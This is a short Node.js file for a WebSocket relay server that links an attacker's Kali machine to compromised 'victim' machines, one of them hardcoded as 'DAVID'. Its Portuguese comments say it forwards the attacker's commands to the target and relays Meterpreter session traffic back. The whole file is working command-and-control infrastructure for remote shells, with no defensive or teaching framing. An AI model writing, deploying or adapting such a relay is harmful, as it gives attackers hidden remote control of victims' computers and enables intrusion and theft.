const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => { res.end("Bridge Online"); });
const wss = new WebSocket.Server({ server });

const clients = { kali: null, victims: new Map() };

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const id = url.searchParams.get('id') || "anon";
    const isKali = url.pathname.includes('kali');

    if (isKali) { clients.kali = ws; console.log("[!] KALI"); }
    else { clients.victims.set(id, ws); console.log(`[+] ALVO: ${id}`); }

    ws.on('message', (data, isBinary) => {
        if (ws === clients.kali) {
            // Se o Kali envia algo, mandamos para o alvo
            // Se for JSON (comando), pegamos o alvo. Se for binário, mandamos pro último alvo.
            const target = clients.victims.get("DAVID"); // Altere para ser dinâmico depois
            if (target) target.send(data, { binary: isBinary });
        } else {
            // Se a vítima envia binário (Meterpreter), mandamos pro Kali
            if (clients.kali) clients.kali.send(data, { binary: isBinary });
        }
    });
});
server.listen(process.env.PORT || 10000);
